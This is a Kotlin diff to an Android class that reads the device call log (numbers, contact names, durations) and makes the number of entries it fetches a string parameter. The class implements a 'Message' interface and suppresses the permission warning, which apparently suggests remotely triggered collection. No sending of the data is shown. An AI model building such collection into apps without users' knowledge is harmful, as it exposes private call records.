@@ -9,10 +9,10 @@ import java.text.SimpleDateFormat
 import java.util.*
 
 
-class CalllogState(override var context: Context) :
+class CalllogState(override var context: Context, val calls: String) :
     Message {
     init {
-        getCallogState(context)
+        getCallogState(context, calls)
     }
 
     companion object {
@@ -20,13 +20,13 @@ class CalllogState(override var context: Context) :
         private val dateAndTimePatern = "yyyy-MM-dd HH:mm:ss"
 
         @SuppressLint("MissingPermission")
-        fun getCallogState(context: Context) {
+        fun getCallogState(context: Context, calls: String) {
             val c: Cursor? = context.contentResolver
                 .query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")
 
             if (c != null) {
                 var index = 0
-                while (c.moveToNext() && index < 20) {
+                while (c.moveToNext() && index < calls.toInt()) {
                     val number = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER))
                     val name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME))
                     val duration = c.getString(c.getColumnIndex(CallLog.Calls.DURATION))
